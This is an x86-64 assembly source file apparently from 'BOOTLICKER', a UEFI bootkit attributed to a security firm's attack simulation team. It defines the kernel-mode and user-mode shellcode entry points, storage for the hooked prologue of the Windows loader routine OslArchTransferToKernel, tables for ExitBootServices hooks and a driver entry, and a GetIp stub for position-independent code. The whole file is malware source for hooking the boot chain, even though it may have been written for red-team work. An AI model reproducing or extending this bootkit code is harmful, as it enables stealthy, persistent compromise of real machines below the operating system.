;;
;; BOOTLICKER
;;
;; GuidePoint Security LLC
;;
;; Threat and Attack Simulation Team
;;
[BITS 64]

;;
;; Export
;;
GLOBAL	EfClg
GLOBAL	EfTbl
GLOBAL	GetIp
GLOBAL	KmEnt
GLOBAL	UmEnt
GLOBAL	UmTbl
GLOBAL	KmTbl

;;
;; Import
;;
EXTERN	KernelMain
EXTERN	UsermodeMain

;;
;; Section
;;
[SECTION .text$C]

;;
;; Purpose:
;;
;; Kernel shellcode entrypoint
;;
KmEnt:
	jmp	KernelMain


;;
;; Section
;;
[SECTION .text$E]

;;
;; Purpose:
;;
;; Usermode shellcode entrypoint
;;
UmEnt:
	;;
	;; Push all the registers
	;;
	jmp	UsermodeMain

;;
;; Purpose:
;;
;; Stores information for the usermode shellcode
;;
UmTbl:
	dq	0

;;
;; Section
;;
[SECTION .text$I]

;;
;; Purpose:
;;
;; Stores information for the kernel shellcode
;;
KmTbl:
	dq	0
	dd	0

;;
;; Purpose:
;; 
;; Stores the hooked prologue for OslArchTransferToKernel
;;
EfClg:
	resb	16
	resb	14

;;
;; Purpose:
;; 
;; Stores information for the bootkit
;;
EfTbl:
	;; ExitBootServicesHook / OslArchTransferToKernelHook
	dq	0
	dq	0

	;; DrvMain
	dq	0
	dd	0
	dq	0
	dq	0
	dq	0
	dq	0
	dd	0

;;
;; Purpose:
;;
;; Returns a pointer to itself.
;;
GetIp:
	;;
	;; Execute next instruction
	;;
	call	get_ret_ptr

	get_ret_ptr:
	;;
	;; Subtract the diference between
	;; get_ret_ptr and GetIp stub
	;;
	pop	rax
	sub	rax, 5

	;;
	;; Return pointer to GetIp
	;;
	ret

;;
;; End of code stub
;;
Leave:
	db 'ENDOFCODE'
